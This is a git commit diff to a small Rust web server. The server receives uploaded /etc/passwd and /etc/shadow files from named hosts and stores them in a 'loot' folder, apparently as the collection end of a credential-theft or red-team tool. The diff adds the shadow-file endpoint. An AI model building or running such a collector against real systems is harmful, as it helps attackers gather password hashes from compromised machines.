80103d3a377ff18a6d4b6ebc9be5b81507d43a37
Mark Wilkinson <markwilkinson@students.westonps.org>
2021-08-25 05:51:21 +0000

    Made it more simple for uploading passwd and shadow files, its 1 51 AM what am i doing

--- src/main.rs
+++ src/main.rs
@@ -8,22 +8,36 @@ fn index() -> &'static str {
     "Web interface in development, not yet implemented, please use the command line client"
 }
 
-#[post("/post/<hostname>/<user>/passwd", format = "plain", data = "<data>")]
-async fn passwd(data: Data<'_>, hostname: String, user: String) -> std::io::Result<()> {
-    let passfile = data.open(512.kibibytes())
-                        .stream_to(tokio::io::stdout())
-                        .await?;
-    println!("{}", passfile);
-    let path = format!("{}/{}/passwd", hostname, user);
-    let mkpath = format!("{}/{}", hostname, user);
-    fs::create_dir_all(mkpath)?;
-    let mut output = File::create(path)?;
-    write!(output, "{}", passfile);
+#[post("/post/<hostname>/passwd", format = "plain", data = "<data>")]
+async fn passwd(data: Data<'_>, hostname: String) -> std::io::Result<()> {
     
+    //create directory and declare location for the passwd file
+    let file_location = format!("loot/{}/passwd", hostname);
+    println!("File location is {}.", file_location);
+
+    let dir = format!("loot/{}", hostname);
+    fs::create_dir_all(&dir);
+    println!("The dir created is {}.", &dir);
+
+    let mut file = File::create(&file_location)?;
+    let stream = data.open(1.megabytes()).into_file(file_location).await?;
+
+    Ok(())
+}
+
+#[post("/post/<hostname>/shadow", format = "plain", data = "<data>")]
+async fn shadow(data: Data<'_>, hostname: String) -> std::io::Result<()> {
+    let file_location = format!("loot/{}/shadow", hostname);
+    
+    let dir = format!("loot/{}", hostname);
+    fs::create_dir_all(&dir);
+    
+    let mut file = File::create(&file_location)?;
+    let stream = data.open(1.megabytes()).into_file(file_location).await?;
     Ok(())
 }
 
 #[launch]
 fn rocket() -> _ {
-    rocket::build().mount("/", routes![index, passwd])
+    rocket::build().mount("/", routes![index, passwd, shadow])
 }
